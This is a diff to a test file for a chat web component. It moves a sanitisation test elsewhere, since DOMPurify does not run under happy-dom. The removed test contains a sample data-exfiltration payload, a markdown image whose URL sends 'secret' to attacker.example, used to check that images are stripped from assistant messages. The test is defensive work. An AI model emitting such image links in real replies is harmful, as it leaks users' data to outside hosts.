@@ -188,17 +188,10 @@ describe("AgUiChat", () => {
     expect(user.textContent).toBe("**bold**");
   });
 
-  it("strips img from assistant bubbles by default; allowImages opts back in", () => {
-    const el = mount();
-    const blocked = el.appendMessage(
-      MESSAGE_ROLE.ASSISTANT,
-      "![x](https://attacker.example/?d=secret)",
-    );
-    expect(blocked.querySelector("img")).toBeNull();
-    el.allowImages = true;
-    const permitted = el.appendMessage(MESSAGE_ROLE.ASSISTANT, "![x](https://ex.com/i.png)");
-    expect(permitted.querySelector("img")?.getAttribute("src")).toBe("https://ex.com/i.png");
-  });
+  // Image stripping moved to tests/browser/ag_ui_chat_sanitisation.browser.test.ts
+  // — happy-dom cannot evaluate it, because DOMPurify 3.4.8+ does not sanitise
+  // under it at all. Asserting it here would pass or fail for reasons unrelated
+  // to this component.
 
   it("hands the agent factory a live header getter (rotated tokens reach the agent)", async () => {
     const el = document.createElement(ELEMENT_TAG) as AgUiChat;
